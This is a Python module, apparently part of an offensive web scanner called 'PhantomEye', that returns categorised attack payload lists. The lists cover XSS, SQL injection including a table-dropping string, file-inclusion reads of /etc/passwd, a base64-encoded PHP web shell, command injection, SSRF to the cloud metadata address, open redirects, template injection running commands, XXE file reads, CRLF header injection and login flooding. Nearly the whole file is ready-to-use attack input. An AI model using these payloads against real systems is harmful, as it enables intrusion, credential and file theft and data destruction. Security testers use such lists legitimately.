"""Payload Generation Module"""

from utils.helpers import print_status

def generate_payloads(target: str, previous_results: dict) -> dict:
    print_status("Generating full payload sets...", "info")

    payloads = {
        "xss": [
            "<script>alert('PhantomEye')</script>",
            "\"><script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
            "<iframe src=\"javascript:alert(1)\">",
            "<img src=x onerror=prompt(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' /*",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "admin'--",
            "1; DROP TABLE users--",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        ],
        "lfi": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....\/....\/....\/etc/passwd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
        ],
        "rce": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "&& id",
            "|| id",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; uname -a",
            "$(whoami)",
        ],
        "ssrf": [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "file:///etc/passwd",
            "http://0.0.0.0",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
        ],
        "open_redirect": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "////evil.com",
            "https:evil.com",
            "//google.com%2f%2e%2e",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
        ],
        "crlf": [
            "%0d%0aSet-Cookie:%20phantom=eye",
            "%0aSet-Cookie:%20phantom=eye",
            "%0d%0aX-Injected:%20true",
        ],
        "api_abuse": [
            "Send 1000+ requests/sec to /api/login",
            "Bulk create objects via /api/users",
            "Recursive nested payloads in GraphQL",
        ]
    }

    print_status(f"Payload categories generated: {len(payloads)}", "success")
    for category, items in payloads.items():
        print_status(f"  • {category.upper():<15} : {len(items)} payloads", "info")

    return payloads
